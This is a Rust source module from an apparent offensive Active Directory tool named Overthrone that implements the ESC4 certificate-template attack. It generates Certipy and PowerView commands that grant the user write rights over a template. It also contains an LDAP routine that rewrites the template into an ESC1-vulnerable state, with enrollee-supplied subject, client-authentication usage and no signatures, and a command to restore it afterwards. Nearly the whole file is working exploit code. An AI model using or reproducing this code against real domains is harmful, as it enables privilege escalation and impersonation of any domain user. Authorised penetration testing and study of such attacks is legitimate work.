//! ESC4 (Vulnerable Certificate Template Access Control) execution
//!
//! Exposes functions to manipulate Certificate Template `ntSecurityDescriptor`
//! allowing an attacker to grant themselves (or all users) rights to
//! modify the template (WriteOwner/WriteDacl/WriteProperty) and then
//! push an ESC1 vulnerable configuration to it for exploitation.
//!
//! Note that the current pure Rust LDAP implementation often struggles with SDDL and binary security descriptors.
//! As per Socratic feedback, we can generate impacket/PowerView scripts for the operator to use.

use crate::error::{OverthroneError, Result};
use crate::proto::ldap::LdapSession;
use tracing::{info, warn};

/// Target for ESC4 template modification
pub struct Esc4Target {
    pub template_name: String,
    pub domain: String,
    pub current_user: String,
}

impl Esc4Target {
    pub fn new(
        template_name: impl Into<String>,
        domain: impl Into<String>,
        current_user: impl Into<String>,
    ) -> Self {
        Self {
            template_name: template_name.into(),
            domain: domain.into(),
            current_user: current_user.into(),
        }
    }

    /// Generate the required PowerView or Certipy commands to abuse the ESC4 vulnerability
    pub fn generate_exploit_commands(&self) -> Result<String> {
        info!(
            "Generating ESC4 exploit commands for template: {}",
            self.template_name
        );

        let certipy_command = format!(
            "certipy template -u '{}' -p 'PASSWORD' -d '{}' -template '{}' -save-old",
            self.current_user, self.domain, self.template_name
        );

        // Let's provide an impacket command as an alternative, but Certipy is standard for this.

        let powerview_command = format!(
            "Add-DomainObjectAcl -TargetIdentity '{}' -PrincipalIdentity '{}' -Rights WriteProperty,WriteDacl -Verbose\n\
            Set-DomainObject -Identity '{}' -Set @{{'msPKI-Certificate-Name-Flag'=1}} -Verbose",
            self.template_name, self.current_user, self.template_name
        );

        let instructions = format!(
            "=== ESC4 Exploit Generation ===\n\
             The template '{}' is vulnerable to ESC4.\n\
             Overthrone currently implements ESC4 via command generation due to AD security descriptor complexity.\n\n\
             [Certipy (Recommended)]\n\
             {}\n\n\
             [PowerView]\n\
             {}\n",
            self.template_name, certipy_command, powerview_command
        );

        Ok(instructions)
    }

    /// Restore the template to its original state
    pub fn generate_restore_commands(&self) -> Result<String> {
        let certipy_restore = format!(
            "certipy template -u '{}' -p 'PASSWORD' -d '{}' -template '{}' -configuration '{}_old.json'",
            self.current_user, self.domain, self.template_name, self.template_name
        );

        let instructions = format!(
            "=== ESC4 Restore Generation ===\n\
             To restore the template '{}' to its original safe configuration:\n\n\
             [Certipy]\n\
             {}\n",
            self.template_name, certipy_restore
        );

        Ok(instructions)
    }

    /// Execute the ESC4 exploit against the target template using LDAP.
    /// This requires the attacker to already have WriteProperty over the template.
    /// It modifies the template to make it vulnerable to ESC1.
    pub async fn execute(&self, ldap: &mut LdapSession, base_dn: &str) -> Result<()> {
        info!("Executing ESC4 exploit on template: {}", self.template_name);

        // Find the template DN
        let filter = format!(
            "(&(objectClass=pKICertificateTemplate)(cn={}))",
            self.template_name
        );
        let config_nc = format!("CN=Configuration,{}", base_dn);

        let entries = ldap
            .custom_search_with_base(&config_nc, &filter, &["distinguishedName"])
            .await?;

        if entries.is_empty() {
            return Err(OverthroneError::Ldap {
                target: self.template_name.clone(),
                reason: "Certificate template not found in LDAP".to_string(),
            });
        }

        let dn = &entries[0].dn;
        info!("Found template DN: {}", dn);

        // Push ESC1 configuration
        // msPKI-Certificate-Name-Flag: 1 (ENROLLEE_SUPPLIES_SUBJECT)
        ldap.modify_replace(dn, "msPKI-Certificate-Name-Flag", b"1")
            .await?;

        // msPKI-Enrollment-Flag: 0 (remove PEND_ALL_REQUESTS)
        // Note: setting it to 9 (AUTO_ENROLLMENT | PUBLISH_TO_DS) is common too
        ldap.modify_replace(dn, "msPKI-Enrollment-Flag", b"9")
            .await?;

        // pKIExtendedKeyUsage: Client Authentication (1.3.6.1.5.5.7.3.2)
        ldap.modify_replace(dn, "pKIExtendedKeyUsage", b"1.3.6.1.5.5.7.3.2")
            .await?;

        // msPKI-Certificate-Application-Policy: Client Authentication (1.3.6.1.5.5.7.3.2)
        ldap.modify_replace(
            dn,
            "msPKI-Certificate-Application-Policy",
            b"1.3.6.1.5.5.7.3.2",
        )
        .await?;

        // Optional: Ensure it requires 0 authorized signatures
        ldap.modify_replace(dn, "msPKI-RA-Signature", b"0").await?;

        info!(
            "Successfully modified {} to be vulnerable to ESC1!",
            self.template_name
        );
        Ok(())
    }
}
